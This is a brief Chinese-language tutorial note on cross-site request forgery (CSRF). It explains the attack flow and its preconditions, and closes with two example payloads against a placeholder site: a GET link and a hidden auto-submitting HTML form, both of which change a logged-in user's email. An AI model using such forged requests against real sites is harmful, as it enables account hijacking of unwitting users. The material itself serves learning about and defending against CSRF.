## CSRF
### 1、介绍
![image](https://github.com/498946975/Security/blob/master/images/csrf_08.png)
```yaml
1、跨站请求伪造(也称为 CSRF)是一种 Web 安全漏洞
2、允许攻击者诱导用户执行他们不打算执行的操作
```
### 2、攻击过程
```yaml
1.用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A; 
2.在用户信息用过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A;
3.用户未退出网站A之前，在同一浏览器中打开一个TAB⻚访问网站B; 
4.网站B接受到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A;
5.浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。
  网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的 恶意代码被执行。
```
### 3、形成CSRF的条件
```yaml
1、一个功能操作。例如更改用户自己的密码
2、基于 Cookie的会话处理
3、没有不可预测的请求参数
    如：token（用完即焚），短信验证码等
```
### 4、GET请求，后面跟自己点参数，让用户点即可
```shell script
https://vulnerable-website.com/email/change?email=lx@qq.com # 用户浏览器已经登陆https://vulnerable-website.com，诱导用户点击，然后修改emial成功
```
### 5、POST请求，需要注意，隐藏标签type="hidden"
```html
<html>
  <body>
    <form action="https://vulnerable-website.com/email/change" method="POST"> <!-- 访问某个页面，这个页面是用户已经登陆的状态，发送post请求 -->
        <input type="hidden" name="email" value="lx@qq.com" />  <!-- 隐藏input标签，key是email，value是自己设定邮箱 -->
    </form>
    <script>
        document.forms[0].submit();     // 默认自动提交请求
    </script>
  </body>
</html>
```